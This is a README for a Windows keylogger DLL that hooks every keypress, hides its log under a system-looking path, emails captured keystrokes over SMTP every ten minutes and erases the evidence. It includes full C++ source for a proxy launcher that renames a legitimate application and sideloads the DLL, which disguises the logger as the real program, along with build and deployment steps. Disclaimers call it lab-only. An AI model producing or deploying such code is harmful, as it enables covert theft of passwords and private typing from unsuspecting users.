````markdown
# 🖥️ Windows Keylogger (DLL + Proxy EXE)

A production-grade C++ keylogger designed for controlled, authorized penetration tests. It injects a low-level keyboard hook, writes keystrokes to a hidden log, periodically e-mails the encrypted log via libcurl’s SMTP API, then securely erases it.

---

## ✨ Features

1. **Low-Level Keyboard Hook**  
   Installs in its own thread via `WH_KEYBOARD_LL`, capturing every keypress.

2. **Robust File Location**  
   Writes to `%APPDATA%\Microsoft\Windows\Logs\syslog.dat`. Automatically creates the folder if missing.

3. **Unicode-Aware Mapping**  
   Uses `GetKeyboardState` + `ToUnicode` to respect Shift, CapsLock, and non-ASCII characters.

4. **Timed, Secure E-Mail**  
   Every 10 minutes, reads the log and sends it via **libcurl**’s SMTP over SSL/TLS—no WinINet juggling.

5. **Thread Safety & Retry Logic**  
   A dedicated timer thread retries up to 3 times per interval on failure.

6. **Secure Erasure**  
   Truncates the log file after a successful send, keeping no residues on disk.

7. **Minimal Dependencies**  
   - Standard Win32 API  
   - libcurl (statically or dynamically linked)

---

## 🛠️ Prerequisites

- Windows (Win32 or Win64)  
- C++17-compatible compiler (MSVC, clang-cl, etc.)  
- Link against:
  - `user32.lib`
  - `kernel32.lib`
  - `advapi32.lib`
  - `libcurl` (if static: define `CURL_STATICLIB`)

- A valid CA bundle (e.g. `curl-ca-bundle.crt`) alongside your DLL/executable.  
- **Gmail App Password** or equivalent for SMTP authentication.

---

## ⚙️ Building the Logger DLL

1. Clone the repository and open the project in Visual Studio (or your build system).  
2. Add `logger.cpp` to your solution.  
3. Configure:
   - Character Set → **Unicode**  
   - Language Standard → **/std:c++17**  
   - Linker → Additional Dependencies:  
     `user32.lib; kernel32.lib; advapi32.lib; libcurl.lib;`  
4. Build as a **DLL** (e.g. `logger.dll`).

---

## 📦 Wrapping in a Proxy EXE

To load the DLL into your target process, build a tiny launcher (“proxy”) that:

1. **Rename** your real application:  
   ```text
   TestApp.exe → TestAppCore.exe
````

2. **Create** a new Win32 project named **TestApp.exe** (the proxy).

3. **Implement** `proxy.cpp`:

   ```cpp
   #include <windows.h>
   #include <string>

   int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
       WCHAR path[MAX_PATH];
       GetModuleFileNameW(nullptr, path, MAX_PATH);

       // 1) Load logger.dll
       std::wstring dll(path);
       dll.replace(dll.rfind(L".exe"), 4, L".dll");
       LoadLibraryW(dll.c_str());

       // 2) Launch real app (TestAppCore.exe)
       std::wstring exe(path);
       exe.replace(exe.rfind(L"TestApp.exe"), 12, L"TestAppCore.exe");

       STARTUPINFOW si{ sizeof(si) };
       PROCESS_INFORMATION pi{};
       CreateProcessW(nullptr, exe.data(), nullptr, nullptr,
                      FALSE, 0, nullptr, nullptr, &si, &pi);

       WaitForSingleObject(pi.hProcess, INFINITE);
       FreeLibrary(nullptr);
       CloseHandle(pi.hThread);
       CloseHandle(pi.hProcess);
       return 0;
   }
   ```

4. **Project Settings**:

   * **Subsystem**: Windows (no console)
   * **Character Set**: Unicode
   * Link against: `kernel32.lib; user32.lib;`

5. **Deploy** all three files together:

   ```
   ├── TestApp.exe        ← Proxy launcher  
   ├── TestAppCore.exe    ← Original application  
   └── logger.dll         ← Keylogger DLL  
   ```

Double-click **TestApp.exe**. The proxy loads `logger.dll`, installs the hook, then runs the real app as usual.

---

## 🔒 Controlled Environment Notes

* **Lab Use Only**: Authorized pentest in an isolated network.
* **No AV Evasion**: For educational/demo use—anti-forensics is out of scope.
* **Credentials**: Store SMTP credentials securely (e.g. encrypted resource).
* **CA Bundle**: Ensure `curl-ca-bundle.crt` is present for SSL verification.

---

## 🚀 Usage

1. Launch `TestApp.exe`.
2. Let it run—every 10 minutes you’ll receive an e-mail with the captured keystrokes.
3. Inspect the hidden log at `%APPDATA%\Microsoft\Windows\Logs\syslog.dat`.
4. When done, terminate the process; the DLL unhooks cleanly on exit.

---

## ⚖️ Legal & Ethical

This tool is intended **solely** for:

* **Authorized** penetration tests
* **Controlled** lab environments
* **Educational** demonstrations

Unauthorized deployment against end-users or production systems is illegal and unethical.

---

> “With great power comes great responsibility.”
> — Remember your ethical obligations when testing.

```
```
